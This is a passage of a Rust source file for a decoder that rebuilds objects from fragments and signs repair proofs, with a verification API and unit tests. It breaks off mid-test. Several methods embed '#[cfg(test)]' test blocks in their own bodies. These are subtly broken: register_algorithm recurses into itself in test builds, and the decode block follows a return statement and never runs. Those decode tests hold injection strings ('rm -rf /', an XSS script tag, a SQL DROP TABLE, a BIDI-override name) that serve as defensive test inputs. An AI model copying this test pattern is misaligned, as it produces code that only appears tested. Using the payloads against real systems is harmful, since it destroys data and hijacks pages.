                AlgorithmId::new("xor_parity_2"),
                AlgorithmId::new("simple_concat"),
            ],
            audit_log: Vec::new(),
            max_audit_log_entries: max_audit_log_entries.max(1),
        };

        // Inline negative-path tests
        #[cfg(test)]
        #[allow(unreachable_code)]
        {
            // Test: zero capacity should clamp to 1
            let decoder = Self::with_audit_log_capacity(ProofMode::Mandatory, "test", "secret", 0);
            assert_eq!(decoder.audit_log_capacity(), 1, "zero capacity should clamp to 1");

            // Test: very large capacity should be accepted
            let large_cap = usize::MAX;
            let decoder = Self::with_audit_log_capacity(ProofMode::Advisory, "test", "secret", large_cap);
            assert_eq!(decoder.audit_log_capacity(), large_cap, "large capacity should be preserved");

            // Test: empty signer ID should be allowed
            let decoder = Self::with_audit_log_capacity(ProofMode::Mandatory, "", "secret", 100);
            assert_eq!(decoder.signer_id, "", "empty signer ID should be preserved");

            // Test: empty signing secret should be allowed
            let decoder = Self::with_audit_log_capacity(ProofMode::Advisory, "test", "", 100);
            assert_eq!(decoder.signing_secret, "", "empty signing secret should be preserved");

            // Test: very long signer ID should be handled
            let long_signer = "x".repeat(10000);
            let decoder = Self::with_audit_log_capacity(ProofMode::Mandatory, &long_signer, "secret", 100);
            assert_eq!(decoder.signer_id.len(), 10000, "long signer ID should be preserved");

            // Test: Unicode in signer ID should be supported
            let unicode_signer = "签名者_υπογράφων";
            let decoder = Self::with_audit_log_capacity(ProofMode::Advisory, unicode_signer, "secret", 100);
            assert_eq!(decoder.signer_id, unicode_signer, "Unicode signer ID should be preserved");

            // Test: special characters in signing secret
            let special_secret = "secret!@#$%^&*()";
            let decoder = Self::with_audit_log_capacity(ProofMode::Mandatory, "test", special_secret, 100);
            assert_eq!(decoder.signing_secret, special_secret, "special characters in secret should be preserved");

            // Test: default algorithms should always be registered
            let decoder = Self::with_audit_log_capacity(ProofMode::Advisory, "test", "secret", 50);
            assert_eq!(decoder.registered_algorithms().len(), 3, "should have 3 default algorithms");
            assert!(decoder.registered_algorithms().iter().any(|alg| alg.as_str() == "reed_solomon_8_4"), "should include reed_solomon_8_4");
            assert!(decoder.registered_algorithms().iter().any(|alg| alg.as_str() == "xor_parity_2"), "should include xor_parity_2");
            assert!(decoder.registered_algorithms().iter().any(|alg| alg.as_str() == "simple_concat"), "should include simple_concat");

            // Test: audit log should start empty
            let decoder = Self::with_audit_log_capacity(ProofMode::Mandatory, "test", "secret", 1000);
            assert!(decoder.audit_log().is_empty(), "audit log should start empty");
        }
    }

    pub fn mode(&self) -> ProofMode {
        self.mode
    }

    pub fn set_mode(&mut self, mode: ProofMode) {
        self.mode = mode;
    }

    pub fn registered_algorithms(&self) -> &[AlgorithmId] {
        &self.registered_algorithms
    }

    pub fn register_algorithm(&mut self, algorithm_id: AlgorithmId) {
        if !self.registered_algorithms.contains(&algorithm_id) {
            push_bounded(
                &mut self.registered_algorithms,
                algorithm_id,
                MAX_REGISTERED_ALGORITHMS,
            );
        }

        // Inline negative-path tests
        #[cfg(test)]
        #[allow(unreachable_code)]
        {
            // Test: registering duplicate algorithm should be idempotent
            let mut decoder = ProofCarryingDecoder::new(ProofMode::Mandatory, "test", "secret");
            let initial_count = decoder.registered_algorithms().len();
            decoder.register_algorithm(AlgorithmId::new("reed_solomon_8_4")); // Already exists
            assert_eq!(decoder.registered_algorithms().len(), initial_count, "duplicate registration should be ignored");

            // Test: registering empty algorithm ID should be allowed
            let mut decoder = ProofCarryingDecoder::new(ProofMode::Mandatory, "test", "secret");
            let initial_count = decoder.registered_algorithms().len();
            decoder.register_algorithm(AlgorithmId::new(""));
            assert_eq!(decoder.registered_algorithms().len(), initial_count + 1, "empty algorithm ID should be registerable");

            // Test: registering many algorithms should respect capacity
            let mut decoder = ProofCarryingDecoder::new(ProofMode::Mandatory, "test", "secret");
            let initial_count = decoder.registered_algorithms().len();
            // Try to register more than the capacity
            for i in 0..MAX_REGISTERED_ALGORITHMS + 10 {
                decoder.register_algorithm(AlgorithmId::new(format!("algo_{}", i)));
            }
            // Should be capped at MAX_REGISTERED_ALGORITHMS via push_bounded
            assert!(decoder.registered_algorithms().len() <= MAX_REGISTERED_ALGORITHMS, "should respect maximum capacity");

            // Test: case sensitivity in algorithm registration
            let mut decoder = ProofCarryingDecoder::new(ProofMode::Mandatory, "test", "secret");
            decoder.register_algorithm(AlgorithmId::new("CaseSensitive"));
            decoder.register_algorithm(AlgorithmId::new("casesensitive"));
            let case_sensitive_count = decoder.registered_algorithms().iter()
                .filter(|alg| alg.as_str().to_lowercase() == "casesensitive").count();
            assert_eq!(case_sensitive_count, 2, "case sensitivity should be preserved");

            // Test: Unicode algorithm IDs should be supported
            let mut decoder = ProofCarryingDecoder::new(ProofMode::Mandatory, "test", "secret");
            let initial_count = decoder.registered_algorithms().len();
            decoder.register_algorithm(AlgorithmId::new("算法_αλγόριθμος"));
            assert_eq!(decoder.registered_algorithms().len(), initial_count + 1, "Unicode algorithm IDs should work");

            // Test: very long algorithm ID should be handled
            let mut decoder = ProofCarryingDecoder::new(ProofMode::Mandatory, "test", "secret");
            let initial_count = decoder.registered_algorithms().len();
            let long_id = "x".repeat(10000);
            decoder.register_algorithm(AlgorithmId::new(&long_id));
            assert_eq!(decoder.registered_algorithms().len(), initial_count + 1, "very long algorithm IDs should work");
        }
    }

    pub fn audit_log(&self) -> &[ProofAuditEvent] {
        &self.audit_log
    }

    pub fn audit_log_capacity(&self) -> usize {
        self.max_audit_log_entries
    }

    fn push_audit_event(&mut self, event: ProofAuditEvent) {
        let cap = self.max_audit_log_entries;
        push_bounded(&mut self.audit_log, event, cap);
    }

    /// Decode/reconstruct an object from fragments.
    ///
    /// Emits REPAIR_PROOF_EMITTED on success.
    pub fn decode(
        &mut self,
        object_id: &str,
        fragments: &[Fragment],
        algorithm_id: &AlgorithmId,
        now_epoch_secs: u64,
        trace_id: &str,
    ) -> Result<DecodeResult, ProofCarryingDecodeError> {
        if !self.registered_algorithms.contains(algorithm_id) {
            return Err(ProofCarryingDecodeError::ReconstructionFailed {
                object_id: object_id.to_string(),
                reason: format!("unregistered algorithm: {algorithm_id}"),
            });
        }

        if fragments.is_empty() {
            return Err(ProofCarryingDecodeError::ReconstructionFailed {
                object_id: object_id.to_string(),
                reason: "no fragments provided".to_string(),
            });
        }

        // Simulate reconstruction: concatenate fragment data
        let mut output_data = Vec::new();
        for fragment in fragments {
            output_data.extend_from_slice(&fragment.data);
        }

        // Compute fragment hashes
        let input_fragment_hashes: Vec<String> =
            fragments.iter().map(|f| hex::encode(f.hash())).collect();

        // Compute output hash
        let output_hash = output_hash_hex(&output_data);

        // Create attestation
        let payload_hash = payload_hash_hex(
            object_id,
            &input_fragment_hashes,
            algorithm_id,
            &output_hash,
            &self.signer_id,
            fragments.len(),
            now_epoch_secs,
            trace_id,
        );

        let signature = signature_hex(&self.signing_secret, &payload_hash);

        let proof_id = format!("rp-{}", &output_hash[..16]);

        let proof = RepairProof {
            proof_id,
            object_id: object_id.to_string(),
            input_fragment_hashes,
            algorithm_id: algorithm_id.clone(),
            output_hash: output_hash.clone(),
            attestation: Attestation {
                signer_id: self.signer_id.clone(),
                signature,
                payload_hash,
            },
            fragment_count: fragments.len(),
            timestamp_epoch_secs: now_epoch_secs,
            trace_id: trace_id.to_string(),
        };

        // [REPAIR_PROOF_EMITTED]
        self.push_audit_event(ProofAuditEvent {
            event_code: REPAIR_PROOF_EMITTED.to_string(),
            object_id: object_id.to_string(),
            fragment_count: fragments.len(),
            algorithm: algorithm_id.as_str().to_string(),
            proof_hash: output_hash,
            mode: format!("{:?}", self.mode),
            trace_id: trace_id.to_string(),
        });

        return Ok(DecodeResult {
            object_id: object_id.to_string(),
            output_data,
            proof: Some(proof),
        });

        // Inline negative-path tests for decode method
        #[cfg(test)]
        #[allow(unreachable_code)]
        {
            // Test: Unicode injection in object_id
            let mut decoder = ProofCarryingDecoder::new(ProofMode::Mandatory, "test_signer", "test_secret");
            let fragments = vec![Fragment::new("frag1", b"data1".to_vec())];
            let algorithm_id = AlgorithmId::new("reed_solomon_8_4");
            let malicious_object_id = "legit\u{202E}tnemalf\u{202D}.txt"; // BIDI override attack
            let result = decoder.decode(&malicious_object_id, &fragments, &algorithm_id, 1000000000, "trace1");
            assert!(result.is_ok(), "Unicode injection in object_id should be preserved but not break functionality");
            if let Ok(decode_result) = result {
                assert_eq!(decode_result.object_id, malicious_object_id, "Malicious object_id should be preserved");
            }

            // Test: Arithmetic overflow protection in timestamp_epoch_secs
            let mut decoder = ProofCarryingDecoder::new(ProofMode::Mandatory, "test_signer", "test_secret");
            let fragments = vec![Fragment::new("frag1", b"test_data".to_vec())];
            let algorithm_id = AlgorithmId::new("reed_solomon_8_4");
            let max_timestamp = u64::MAX;
            let result = decoder.decode("obj1", &fragments, &algorithm_id, max_timestamp, "trace_overflow");
            assert!(result.is_ok(), "Maximum timestamp should be handled without overflow");
            if let Ok(decode_result) = result {
                assert_eq!(decode_result.proof.as_ref().unwrap().timestamp_epoch_secs, max_timestamp, "Timestamp should be preserved");
            }

            // Test: Memory exhaustion through massive fragment concatenation
            let mut decoder = ProofCarryingDecoder::new(ProofMode::Mandatory, "test_signer", "test_secret");
            let massive_data = vec![0u8; 1_000_000]; // 1MB per fragment
            let fragments: Vec<Fragment> = (0..10) // 10MB total
                .map(|i| Fragment::new(&format!("massive_frag_{}", i), massive_data.clone()))
                .collect();
            let algorithm_id = AlgorithmId::new("simple_concat");
            let result = decoder.decode("massive_obj", &fragments, &algorithm_id, 1000000001, "trace_massive");
            assert!(result.is_ok(), "Massive fragment concatenation should complete without memory issues");
            if let Ok(decode_result) = result {
                assert_eq!(decode_result.output_data.len(), 10_000_000, "Output should be 10MB");
            }

            // Test: Concurrent operation simulation (rapid sequential decodes)
            use std::sync::{Arc, Mutex};
            use std::thread;
            let shared_decoder = Arc::new(Mutex::new(ProofCarryingDecoder::new(ProofMode::Advisory, "concurrent_signer", "concurrent_secret")));
            let mut handles = vec![];
            for i in 0..5 {
                let decoder_clone = Arc::clone(&shared_decoder);
                let handle = thread::spawn(move || {
                    let fragment = Fragment::new(&format!("concurrent_frag_{}", i), format!("data_{}", i).into_bytes());
                    let algorithm_id = AlgorithmId::new("simple_concat");
                    let mut decoder = decoder_clone.lock().unwrap();
                    decoder.decode(&format!("concurrent_obj_{}", i), &[fragment], &algorithm_id, 1000000002 + i as u64, &format!("trace_concurrent_{}", i))
                });
                handles.push(handle);
            }
            for handle in handles {
                let result = handle.join().unwrap();
                assert!(result.is_ok(), "Concurrent decodes should all succeed");
            }

            // Test: Unregistered algorithm attack vector
            let mut decoder = ProofCarryingDecoder::new(ProofMode::Mandatory, "test_signer", "test_secret");
            let fragments = vec![Fragment::new("frag1", b"data1".to_vec())];
            let malicious_algorithm = AlgorithmId::new("malicious_algorithm\x00\x01\x02"); // With control characters
            let result = decoder.decode("obj1", &fragments, &malicious_algorithm, 1000000003, "trace_unregistered");
            assert!(result.is_err(), "Unregistered algorithm should be rejected");
            if let Err(ProofCarryingDecodeError::ReconstructionFailed { reason, .. }) = result {
                assert!(reason.contains("unregistered algorithm"), "Error should indicate unregistered algorithm");
            }

            // Test: Empty fragments collection edge case
            let mut decoder = ProofCarryingDecoder::new(ProofMode::Mandatory, "test_signer", "test_secret");
            let empty_fragments: Vec<Fragment> = vec![];
            let algorithm_id = AlgorithmId::new("reed_solomon_8_4");
            let result = decoder.decode("empty_obj", &empty_fragments, &algorithm_id, 1000000004, "trace_empty");
            assert!(result.is_err(), "Empty fragments should be rejected");
            if let Err(ProofCarryingDecodeError::ReconstructionFailed { reason, .. }) = result {
                assert!(reason.contains("no fragments"), "Error should indicate no fragments provided");
            }

            // Test: Audit log capacity boundary attacks
            let mut decoder = ProofCarryingDecoder::with_audit_log_capacity(ProofMode::Advisory, "audit_signer", "audit_secret", 3);
            let fragment = Fragment::new("audit_frag", b"audit_data".to_vec());
            let algorithm_id = AlgorithmId::new("simple_concat");
            // Generate more audit events than capacity
            for i in 0..10 {
                let _ = decoder.decode(&format!("audit_obj_{}", i), &[fragment.clone()], &algorithm_id, 1000000005 + i as u64, &format!("trace_audit_{}", i));
            }
            assert!(decoder.audit_log().len() <= 3, "Audit log should be bounded by capacity");
            // Should keep only the most recent entries
            assert!(decoder.audit_log().iter().all(|event| event.trace_id.contains("audit_")), "Audit log should contain recent events");

            // Test: Hash collision resistance in fragment and output processing
            let mut decoder = ProofCarryingDecoder::new(ProofMode::Mandatory, "hash_signer", "hash_secret");
            // Create fragments with similar but distinct data that might collide
            let fragment1 = Fragment::new("collision1", b"similar_data_variant_a".to_vec());
            let fragment2 = Fragment::new("collision2", b"similar_data_variant_b".to_vec());
            let algorithm_id = AlgorithmId::new("simple_concat");

            let result1 = decoder.decode("hash_obj1", &[fragment1], &algorithm_id, 1000000006, "trace_hash1");
            let result2 = decoder.decode("hash_obj2", &[fragment2], &algorithm_id, 1000000007, "trace_hash2");

            assert!(result1.is_ok() && result2.is_ok(), "Both hash operations should succeed");
            if let (Ok(decode1), Ok(decode2)) = (result1, result2) {
                assert_ne!(decode1.proof.as_ref().unwrap().output_hash, decode2.proof.as_ref().unwrap().output_hash, "Different inputs should produce different output hashes");
                assert_ne!(decode1.proof.as_ref().unwrap().proof_id, decode2.proof.as_ref().unwrap().proof_id, "Different outputs should have different proof IDs");
            }

            // Test: Resource exhaustion through trace_id flooding
            let mut decoder = ProofCarryingDecoder::new(ProofMode::Advisory, "trace_signer", "trace_secret");
            let fragment = Fragment::new("trace_frag", b"trace_data".to_vec());
            let algorithm_id = AlgorithmId::new("simple_concat");
            let massive_trace_id = "x".repeat(100_000); // 100KB trace ID
            let result = decoder.decode("trace_obj", &[fragment], &algorithm_id, 1000000008, &massive_trace_id);
            assert!(result.is_ok(), "Massive trace_id should be handled gracefully");
            if let Ok(decode_result) = result {
                assert_eq!(decode_result.proof.as_ref().unwrap().trace_id, massive_trace_id, "Massive trace_id should be preserved");
            }

            // Test: Serialization format injection resistance in proof generation
            let mut decoder = ProofCarryingDecoder::new(ProofMode::Mandatory, "serial_signer", "serial_secret");
            let malicious_fragment = Fragment::new("injection_frag", br#"{"malicious":"json","command":"rm -rf /"}"#.to_vec());
            let algorithm_id = AlgorithmId::new("simple_concat");
            let malicious_object_id = r#"</proof><script>alert('xss')</script><proof>"#;
            let malicious_trace_id = r#"'; DROP TABLE proofs; --"#;

            let result = decoder.decode(malicious_object_id, &[malicious_fragment], &algorithm_id, 1000000009, malicious_trace_id);
            assert!(result.is_ok(), "Serialization injection should be handled safely");
            if let Ok(decode_result) = result {
                // Proof should contain the malicious strings as-is but not execute them
                assert_eq!(decode_result.proof.as_ref().unwrap().object_id, malicious_object_id);
                assert_eq!(decode_result.proof.as_ref().unwrap().trace_id, malicious_trace_id);
                // Data should be preserved exactly without interpretation
                assert_eq!(decode_result.output_data, br#"{"malicious":"json","command":"rm -rf /"}"#);
            }

            // Test: Fragment count arithmetic boundary validation
            let mut decoder = ProofCarryingDecoder::new(ProofMode::Mandatory, "count_signer", "count_secret");
            let single_fragment = Fragment::new("count_frag", b"count_data".to_vec());
            let algorithm_id = AlgorithmId::new("simple_concat");
            let result = decoder.decode("count_obj", &[single_fragment], &algorithm_id, 1000000010, "trace_count");
            assert!(result.is_ok(), "Single fragment should be processed correctly");
            if let Ok(decode_result) = result {
                assert_eq!(decode_result.proof.as_ref().unwrap().fragment_count, 1, "Fragment count should be accurate");
                // Verify that fragment_count is used consistently in hash computation
                assert!(decode_result.proof.as_ref().unwrap().attestation.payload_hash.len() > 0, "Payload hash should be computed");
            }

            // Test: Signing secret boundary conditions
            let empty_secret_decoder = ProofCarryingDecoder::new(ProofMode::Advisory, "empty_secret_signer", "");
            let mut decoder = empty_secret_decoder;
            let fragment = Fragment::new("secret_frag", b"secret_data".to_vec());
            let algorithm_id = AlgorithmId::new("simple_concat");
            let result = decoder.decode("secret_obj", &[fragment], &algorithm_id, 1000000011, "trace_secret");
            assert!(result.is_ok(), "Empty signing secret should be allowed");
            if let Ok(decode_result) = result {
                assert!(decode_result.proof.as_ref().unwrap().attestation.signature.len() > 0, "Signature should still be generated");
            }
        }
    }
}

// ---------------------------------------------------------------------------
// ProofVerificationApi
// ---------------------------------------------------------------------------

/// Verification API for repair proofs.
pub struct ProofVerificationApi {
    signing_secret: String,
    registered_algorithms: Vec<AlgorithmId>,
}

impl ProofVerificationApi {
    pub fn new(signing_secret: &str, registered_algorithms: Vec<AlgorithmId>) -> Self {
        Self {
            signing_secret: signing_secret.to_string(),
            registered_algorithms,
        }
    }

    /// Verify a repair proof against stored fragment originals and recomputed output.
    pub fn verify(
        &self,
        proof: &RepairProof,
        original_fragment_hashes: &[String],
        recomputed_output_hash: &str,
    ) -> VerificationResult {
        // (a) Check input fragment hashes match stored originals
        if proof.input_fragment_hashes.len() != original_fragment_hashes.len() {
            return VerificationResult::InvalidFragmentHash {
                index: 0,
                expected: format!("count={}", original_fragment_hashes.len()),
                actual: format!("count={}", proof.input_fragment_hashes.len()),
            };
        }
        for (i, (proof_hash, original_hash)) in proof
            .input_fragment_hashes
            .iter()
            .zip(original_fragment_hashes.iter())
            .enumerate()
        {
            if !constant_time::ct_eq_bytes(proof_hash.as_bytes(), original_hash.as_bytes()) {
                return VerificationResult::InvalidFragmentHash {
                    index: i,
                    expected: original_hash.clone(),
                    actual: proof_hash.clone(),
                };
            }
        }

        // (b) Check algorithm is registered
        if !self.registered_algorithms.contains(&proof.algorithm_id) {
            return VerificationResult::UnknownAlgorithm {
                algorithm_id: proof.algorithm_id.clone(),
            };
        }

        // (c) Check output hash matches recomputed value
        if !constant_time::ct_eq_bytes(
            proof.output_hash.as_bytes(),
            recomputed_output_hash.as_bytes(),
        ) {
            return VerificationResult::OutputHashMismatch {
                expected: recomputed_output_hash.to_string(),
                actual: proof.output_hash.clone(),
            };
        }

        // (d) Verify signature
        let expected_payload_hash = payload_hash_hex(
            &proof.object_id,
            &proof.input_fragment_hashes,
            &proof.algorithm_id,
            &proof.output_hash,
            &proof.attestation.signer_id,
            proof.fragment_count,
            proof.timestamp_epoch_secs,
            &proof.trace_id,
        );

        if !constant_time::ct_eq_bytes(
            proof.attestation.payload_hash.as_bytes(),
            expected_payload_hash.as_bytes(),
        ) {
            return VerificationResult::InvalidSignature;
        }

        let expected_signature = signature_hex(&self.signing_secret, &expected_payload_hash);

        if !constant_time::ct_eq_bytes(
            proof.attestation.signature.as_bytes(),
            expected_signature.as_bytes(),
        ) {
            return VerificationResult::InvalidSignature;
        }

        VerificationResult::Valid
    }

    /// Check whether a proof is present (for mandatory mode enforcement).
    pub fn check_proof_presence(
        &self,
        proof: Option<&RepairProof>,
        mode: ProofMode,
        object_id: &str,
    ) -> Result<(), ProofCarryingDecodeError> {
        match (proof, mode) {
            (None, ProofMode::Mandatory) => {
                Err(ProofCarryingDecodeError::MissingProofInMandatoryMode {
                    object_id: object_id.to_string(),
                })
            }
            _ => Ok(()),
        }
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    fn test_fragments() -> Vec<Fragment> {
        vec![
            Fragment {
                fragment_id: "frag-001".to_string(),
                data: vec![0xAA; 32],
            },
            Fragment {
                fragment_id: "frag-002".to_string(),
                data: vec![0xBB; 32],
            },
            Fragment {
                fragment_id: "frag-003".to_string(),
                data: vec![0xCC; 32],
            },
        ]
    }

    fn decoder() -> ProofCarryingDecoder {
        ProofCarryingDecoder::new(ProofMode::Mandatory, "test-signer", "test-secret")
    }

    fn verification_api() -> ProofVerificationApi {
        ProofVerificationApi::new(
            "test-secret",
            vec![
                AlgorithmId::new("reed_solomon_8_4"),
                AlgorithmId::new("xor_parity_2"),
                AlgorithmId::new("simple_concat"),
            ],
        )
    }

    fn original_hashes(fragments: &[Fragment]) -> Vec<String> {
        fragments
            .iter()
            .map(|fragment| hex::encode(fragment.hash()))
            .collect()
    }

    fn assert_digest_eq(left: &[u8], right: &[u8]) {
        assert!(constant_time::ct_eq_bytes(left, right));
    }

    fn assert_digest_ne(left: &[u8], right: &[u8]) {
        assert!(!constant_time::ct_eq_bytes(left, right));
    }

    fn assert_hash_eq(left: &str, right: &str) {
        assert_digest_eq(left.as_bytes(), right.as_bytes());
    }

    fn assert_hash_ne(left: &str, right: &str) {
        assert_digest_ne(left.as_bytes(), right.as_bytes());
    }

    fn decode_with(
        object_id: &str,
        fragments: &[Fragment],
        now_epoch_secs: u64,
        trace_id: &str,
    ) -> DecodeResult {
        decoder()
            .decode(
                object_id,
                fragments,
                &AlgorithmId::new("simple_concat"),
                now_epoch_secs,
                trace_id,
            )
            .expect("decode should succeed")
    }

    fn assert_proof_valid(proof: &RepairProof, fragments: &[Fragment], output_data: &[u8]) {
        let verification = verification_api().verify(
            proof,
            &original_hashes(fragments),
            &output_hash_hex(output_data),
        );
        assert_eq!(verification, VerificationResult::Valid);
    }

    // ── Fragment tests ──

    #[test]
    fn test_fragment_hash_deterministic() {
        let f = Fragment {
            fragment_id: "f-1".to_string(),
            data: vec![0x42; 16],
        };
        assert_digest_eq(&f.hash(), &f.hash());
    }

    #[test]
    fn test_fragment_hash_different_data() {
        let f1 = Fragment {
            fragment_id: "f-1".to_string(),
            data: vec![0x00; 16],
        };
        let f2 = Fragment {
            fragment_id: "f-2".to_string(),
            data: vec![0xFF; 16],
        };
        assert_digest_ne(&f1.hash(), &f2.hash());
    }

    #[test]
    fn mr_fragment_id_mutation_changes_fragment_hash_for_same_data() {
        let original = Fragment {
            fragment_id: "f-1".to_string(),
            data: vec![0x42; 16],
        };
        let transformed = Fragment {
            fragment_id: "f-2".to_string(),
            data: original.data.clone(),
        };

        assert_digest_ne(&original.hash(), &transformed.hash());
    }

    // ── AlgorithmId tests ──

    #[test]
    fn test_algorithm_id_display() {
        let id = AlgorithmId::new("reed_solomon_8_4");
        assert_eq!(id.to_string(), "reed_solomon_8_4");
        assert_eq!(id.as_str(), "reed_solomon_8_4");
    }

    // ── ProofCarryingDecoder tests ──

    #[test]
    fn test_decode_success() {
        let mut dec = decoder();
        let frags = test_fragments();
        let result = dec
            .decode(
                "obj-001",
                &frags,
                &AlgorithmId::new("simple_concat"),
                1000,
                "t-1",
            )
            .unwrap();
        assert_eq!(result.object_id, "obj-001");
        assert!(!result.output_data.is_empty());
        assert!(result.proof.is_some());
    }

    #[test]
    fn test_decode_emits_proof() {
        let mut dec = decoder();
        let frags = test_fragments();
        let result = dec
            .decode(
                "obj-001",
                &frags,
                &AlgorithmId::new("simple_concat"),
                1000,
                "t-1",
            )
            .unwrap();
        let proof = result.proof.expect("proof should be present");
        assert_eq!(proof.object_id, "obj-001");
        assert_eq!(proof.fragment_count, 3);
        assert_eq!(proof.input_fragment_hashes.len(), 3);
        assert!(!proof.output_hash.is_empty());
        assert!(!proof.attestation.signature.is_empty());
    }

    #[test]
    fn test_decode_audit_event() {
        let mut dec = decoder();
        let frags = test_fragments();
        dec.decode(
            "obj-001",
            &frags,
            &AlgorithmId::new("simple_concat"),
            1000,
            "t-1",
        )
        .unwrap();
        assert_eq!(dec.audit_log().len(), 1);
        assert_eq!(dec.audit_log()[0].event_code, REPAIR_PROOF_EMITTED);
    }

    #[test]
    fn test_decode_unregistered_algorithm() {
        let mut dec = decoder();
        let frags = test_fragments();
        let err = dec
            .decode(
                "obj-001",
                &frags,
                &AlgorithmId::new("unknown_algo"),
                1000,
                "t-1",
            )
            .unwrap_err();
        assert_eq!(err.code(), "RECONSTRUCTION_FAILED");
    }

    #[test]
    fn test_decode_empty_fragments() {
        let mut dec = decoder();
        let err = dec
            .decode(
                "obj-001",
                &[],
                &AlgorithmId::new("simple_concat"),
                1000,
                "t-1",
            )
            .unwrap_err();
        assert_eq!(err.code(), "RECONSTRUCTION_FAILED");
    }

    #[test]
    fn test_decode_output_is_concatenation() {
        let mut dec = decoder();
        let frags = vec![
            Fragment {
                fragment_id: "a".into(),
                data: vec![1, 2, 3],
            },
            Fragment {
                fragment_id: "b".into(),
                data: vec![4, 5, 6],
            },
        ];
        let result = dec
            .decode(
                "obj-001",
                &frags,
                &AlgorithmId::new("simple_concat"),
                1000,
                "t-1",
            )
            .unwrap();
        assert_eq!(result.output_data, vec![1, 2, 3, 4, 5, 6]);
    }

    #[test]
    fn test_decode_proof_id_format() {
        let mut dec = decoder();
        let frags = test_fragments();
        let result = dec
            .decode(
                "obj-001",
                &frags,
                &AlgorithmId::new("simple_concat"),
                1000,
                "t-1",
            )
            .unwrap();
        let proof = result.proof.expect("proof should be present");
        assert!(proof.proof_id.starts_with("rp-"));
    }

    #[test]
    fn test_decode_timestamp_propagated() {
        let mut dec = decoder();
        let frags = test_fragments();
        let result = dec
            .decode(
                "obj-001",
                &frags,
                &AlgorithmId::new("simple_concat"),
                9999,
                "t-1",
            )
            .unwrap();
        assert_eq!(result.proof.unwrap().timestamp_epoch_secs, 9999);
    }

    #[test]
    fn test_decode_trace_id_propagated() {
        let mut dec = decoder();
        let frags = test_fragments();
        let result = dec
            .decode(
                "obj-001",
                &frags,
                &AlgorithmId::new("simple_concat"),
                1000,
                "trace-xyz",
            )
            .unwrap();
        assert_eq!(result.proof.unwrap().trace_id, "trace-xyz");
    }

    // ── ProofMode tests ──

    #[test]
    fn test_mode_mandatory() {
        let dec = ProofCarryingDecoder::new(ProofMode::Mandatory, "s", "k");
        assert_eq!(dec.mode(), ProofMode::Mandatory);
    }

    #[test]
    fn test_mode_advisory() {
        let dec = ProofCarryingDecoder::new(ProofMode::Advisory, "s", "k");
        assert_eq!(dec.mode(), ProofMode::Advisory);
    }

    #[test]
    fn test_decoder_default_audit_log_capacity() {
        let dec = decoder();
        assert_eq!(dec.audit_log_capacity(), DEFAULT_MAX_AUDIT_LOG_ENTRIES);
    }

    #[test]
    fn test_decoder_audit_log_capacity_clamps_to_one() {
        let mut dec = ProofCarryingDecoder::with_audit_log_capacity(
            ProofMode::Mandatory,
            "test-signer",
            "test-secret",
            0,
        );
        let frags = test_fragments();
        dec.decode(
            "obj-001",
            &frags,
            &AlgorithmId::new("simple_concat"),
            1000,
            "t-1",
        )
        .unwrap();
        dec.decode(
            "obj-002",
            &frags,
            &AlgorithmId::new("simple_concat"),
            1001,
            "t-2",
        )
        .unwrap();

        assert_eq!(dec.audit_log_capacity(), 1);
        assert_eq!(dec.audit_log().len(), 1);
        assert_eq!(dec.audit_log()[0].object_id, "obj-002");
    }

    #[test]
    fn test_mode_switch() {
        let mut dec = decoder();
        assert_eq!(dec.mode(), ProofMode::Mandatory);
        dec.set_mode(ProofMode::Advisory);
        assert_eq!(dec.mode(), ProofMode::Advisory);
    }

    // ── Register algorithm tests ──

    #[test]
    fn test_register_algorithm() {
        let mut dec = decoder();
        let initial = dec.registered_algorithms().len();
        dec.register_algorithm(AlgorithmId::new("custom_algo"));
        assert_eq!(dec.registered_algorithms().len(), initial + 1);
    }

    #[test]
    fn test_register_duplicate_algorithm() {
        let mut dec = decoder();
        let initial = dec.registered_algorithms().len();
        dec.register_algorithm(AlgorithmId::new("simple_concat"));
        assert_eq!(dec.registered_algorithms().len(), initial);
    }

    // ── ProofVerificationApi tests ──

    #[test]
    fn test_verify_valid_proof() {
        let mut dec = decoder();
        let frags = test_fragments();
        let result = dec
            .decode(
                "obj-001",
                &frags,
                &AlgorithmId::new("simple_concat"),
                1000,
                "t-1",
            )
            .unwrap();
        let proof = result.proof.expect("proof should be present");

        let api = verification_api();
        let original_hashes: Vec<String> = frags.iter().map(|f| hex::encode(f.hash())).collect();

        let recomputed = output_hash_hex(&result.output_data);

        let v = api.verify(&proof, &original_hashes, &recomputed);
        assert!(v.is_valid());
        assert_eq!(v.event_code(), REPAIR_PROOF_VERIFIED);
    }

    #[test]
    fn test_verify_tampered_fragment_hash() {
        let mut dec = decoder();
        let frags = test_fragments();
        let result = dec
            .decode(
                "obj-001",
                &frags,
                &AlgorithmId::new("simple_concat"),
                1000,
                "t-1",
            )
            .unwrap();
        let proof = result.proof.expect("proof should be present");

        let api = verification_api();
        let mut original_hashes: Vec<String> =
            frags.iter().map(|f| hex::encode(f.hash())).collect();
        original_hashes[0] = "tampered_hash".to_string();

        let v = api.verify(&proof, &original_hashes, &proof.output_hash);
        assert!(!v.is_valid());
        assert_eq!(
            v,
            VerificationResult::InvalidFragmentHash {
                index: 0,
                expected: "tampered_hash".to_string(),
                actual: proof.input_fragment_hashes[0].clone(),
            }
        );
        assert_eq!(v.event_code(), REPAIR_PROOF_INVALID);
    }

    #[test]
    fn test_verify_wrong_algorithm() {
        let mut dec = decoder();
        let frags = test_fragments();
        let result = dec
            .decode(
                "obj-001",
                &frags,
                &AlgorithmId::new("simple_concat"),
                1000,
                "t-1",
            )
            .unwrap();
        let mut proof = result.proof.expect("proof should be present");
        proof.algorithm_id = AlgorithmId::new("nonexistent_algo");

        let api = verification_api();
        let original_hashes: Vec<String> = frags.iter().map(|f| hex::encode(f.hash())).collect();
        let v = api.verify(&proof, &original_hashes, &proof.output_hash);
        assert!(!v.is_valid());
    }

    #[test]
    fn test_verify_output_hash_mismatch() {
        let mut dec = decoder();
        let frags = test_fragments();
        let result = dec
            .decode(
                "obj-001",
                &frags,
                &AlgorithmId::new("simple_concat"),
                1000,
                "t-1",
            )
            .unwrap();
        let proof = result.proof.expect("proof should be present");

        let api = verification_api();
        let original_hashes: Vec<String> = frags.iter().map(|f| hex::encode(f.hash())).collect();
        let v = api.verify(&proof, &original_hashes, "wrong_output_hash");
        assert!(!v.is_valid());
        assert_eq!(
            v,
            VerificationResult::OutputHashMismatch {
                expected: "wrong_output_hash".to_string(),
                actual: proof.output_hash.clone(),
            }
        );
    }

    #[test]
    fn test_verify_invalid_signature() {
        let mut dec = decoder();
        let frags = test_fragments();
